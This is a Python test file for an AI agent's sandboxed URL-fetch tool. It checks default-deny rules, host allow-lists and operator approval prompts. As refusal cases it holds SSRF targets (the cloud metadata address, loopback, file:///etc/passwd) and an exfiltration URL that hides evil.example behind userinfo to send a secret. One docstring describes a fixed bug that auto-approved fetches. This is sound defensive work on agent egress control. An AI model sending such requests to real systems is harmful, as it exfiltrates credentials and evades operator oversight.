# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Eric Lesiuta
"""`fetch`: the one way a worker with no network reads a URL.

It is an egress channel a model drives, so every check here is a default-deny
and the operator's allow-list is what makes a read silent.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from agent6.config import Config
from agent6.tools.dispatch import ToolDenied, ToolDispatcher, ToolError
from agent6.tools.fetch import FetchRefused, check_url, host_allowed


@pytest.mark.parametrize(
    "url",
    [
        "http://docs.python.org/3/",  # plaintext: a MITM would feed the model
        "file:///etc/passwd",
        "ftp://example.com/x",
        "/etc/passwd",
        "https:///nohost",
    ],
)
def test_only_https_with_a_host_is_fetched(url: str) -> None:
    with pytest.raises(FetchRefused):
        check_url(url)


@pytest.mark.parametrize(
    "host",
    [
        "localhost",  # a loopback admin port
        "127.0.0.1",
        "169.254.169.254",  # the cloud metadata endpoint
        "10.0.0.1",
        "192.168.1.1",
        "[::1]",
    ],
)
def test_a_url_that_resolves_off_the_public_internet_is_refused(host: str) -> None:
    """SSRF is the whole threat: the agent process sits inside the operator's
    network and holds their credentials."""
    with pytest.raises(FetchRefused, match="not a public address"):
        check_url(f"https://{host}/x")


@pytest.mark.parametrize(
    ("host", "allowed", "expected"),
    [
        ("docs.python.org", ("docs.python.org",), True),
        ("DOCS.python.ORG", ("docs.python.org",), True),  # case-folded
        ("evil.com", ("docs.python.org",), False),
        ("x.readthedocs.io", (".readthedocs.io",), True),  # a leading dot allows subdomains
        ("readthedocs.io", (".readthedocs.io",), True),
        ("notreadthedocs.io", (".readthedocs.io",), False),  # ...and only subdomains
        ("anything.example", ("*",), True),
        ("anything.example", (), False),  # empty means NONE, never everything
    ],
)
def test_the_allow_list_matches_hosts_not_prefixes(
    host: str, allowed: tuple[str, ...], expected: bool
) -> None:
    """A URL-prefix match would let `evil.com/docs.python.org` through."""
    assert host_allowed(host, allowed) is expected


def test_a_host_the_operator_never_named_is_asked_about(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The list is the standing approval; a host off it is the operator's call."""
    from agent6.tools import dispatch as dispatch_mod
    from agent6.tools.fetch import Target

    asked: list[str] = []

    def _deny(prompt: str, /, *, standing: bool = True) -> bool:
        asked.append(prompt)
        return False

    def _checked(url: str) -> Target:
        return Target(url=url, host="example.com", address="93.184.216.34")

    monkeypatch.setattr(dispatch_mod, "check_url", _checked)
    d = ToolDispatcher(root=tmp_path, config=Config(), approver=_deny)
    with pytest.raises(ToolDenied, match="fetch not approved"):
        d.dispatch("fetch", {"url": "https://example.com/x"})
    assert asked == ["Allow fetch: example.com (93.184.216.34) /x"]


def test_an_allowed_host_is_never_prompted_for(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from agent6.tools import dispatch as dispatch_mod
    from agent6.tools.fetch import Fetched, Target

    def _loud(_prompt: str, /, *, standing: bool = True) -> bool:
        return pytest.fail("an allowed host must not prompt")

    def _checked(url: str) -> Target:
        return Target(url=url, host="example.com", address="93.184.216.34")

    def _fetched(target: Target) -> Fetched:
        return Fetched(url=target.url, status=200, content_type="text/plain", body="hello")

    monkeypatch.setattr(dispatch_mod, "check_url", _checked)
    monkeypatch.setattr(dispatch_mod, "fetch", _fetched)
    cfg = Config.model_validate({"sandbox": {"fetch_hosts": ["example.com"]}})
    d = ToolDispatcher(root=tmp_path, config=cfg, approver=_loud)
    assert d.dispatch("fetch", {"url": "https://example.com/x"}).to_wire()["body"] == "hello"


def test_the_tool_is_hidden_when_commands_already_have_the_network(tmp_path: Path) -> None:
    """With `tool_network = "allow"` the worker can run curl. Two ways to do
    one thing is the thing we do not do."""
    blocked = ToolDispatcher(root=tmp_path, config=Config())
    allowed = ToolDispatcher(
        root=tmp_path, config=Config.model_validate({"sandbox": {"tool_network": "allow"}})
    )
    assert "fetch" in blocked.available_tool_names()
    assert "fetch" not in allowed.available_tool_names()


def test_a_url_naming_one_host_and_dialling_another_is_refused() -> None:
    """httpx builds an Authorization header from userinfo, so `@` is the model
    choosing a credential AND hiding the real host: the operator's eye lands on
    `docs.python.org` while the query string goes to `evil.example`."""
    with pytest.raises(FetchRefused, match="credentials"):
        check_url("https://docs.python.org@evil.example/exfil?k=SECRET")


def test_the_operator_is_asked_about_the_host_that_will_be_dialled(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The prompt showed the model's raw URL. It shows the RESOLVED host and
    the address the connection is pinned to."""
    from agent6.tools import dispatch as dispatch_mod
    from agent6.tools.fetch import Target

    asked: list[str] = []

    def _record(prompt: str, /, *, standing: bool = True) -> bool:
        asked.append(prompt)
        return False

    def _checked(_url: str) -> Target:
        return Target(url="https://evil.example/x", host="evil.example", address="93.184.216.34")

    monkeypatch.setattr(dispatch_mod, "check_url", _checked)
    d = ToolDispatcher(root=tmp_path, config=Config(), approver=_record)
    with pytest.raises(ToolDenied):
        d.dispatch("fetch", {"url": "https://docs.python.org@evil.example/x"})
    assert asked == ["Allow fetch: evil.example (93.184.216.34) /x"]


def test_allowing_every_command_does_not_allow_the_network(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One "s" at a run_command prompt set a session marker the shared approver
    short-circuits on -- so every later fetch, to any host, was auto-approved
    for the rest of the run. The operator was answering about commands: both
    the prompt and the modal say so."""
    from agent6.events import EventSink
    from agent6.runs.ipc import set_away_mode, set_session_allow
    from agent6.ui.cli._interact import build_approver

    run_dir = tmp_path / "run"
    (run_dir / "approvals").mkdir(parents=True)
    set_session_allow(run_dir)
    approve = build_approver(run_dir, EventSink(run_dir / "logs.jsonl"))

    assert approve("Allow run_command: ls") is True
    # away-mode deny, so the opted-out call refuses instead of polling for a
    # front-end that will never attach.
    set_away_mode(run_dir, "deny")
    assert approve("Allow fetch: evil.example (1.2.3.4) /x", standing=False) is False


def test_a_hidden_fetch_cannot_still_be_dispatched(tmp_path: Path) -> None:
    """Every other hiding rule has a matching refusal in dispatch; this one had
    none, so exposure and enforcement could drift."""
    cfg = Config.model_validate({"sandbox": {"tool_network": "allow"}})
    d = ToolDispatcher(root=tmp_path, config=cfg)
    assert "fetch" not in d.available_tool_names()
    with pytest.raises(ToolError, match="not available"):
        d.dispatch("fetch", {"url": "https://example.com/x"})


def test_a_machine_state_gets_no_network(tmp_path: Path) -> None:
    """It answers about ITS input. A deliverable assembled from a page the
    state fetched is not the deliverable the operator asked for."""
    from agent6.tools.schema import mode_tools

    assert "fetch" in mode_tools("run").names
    assert "fetch" in mode_tools("ask").names
    assert "fetch" not in mode_tools("machine").names
    assert "fetch" not in mode_tools("agent").names
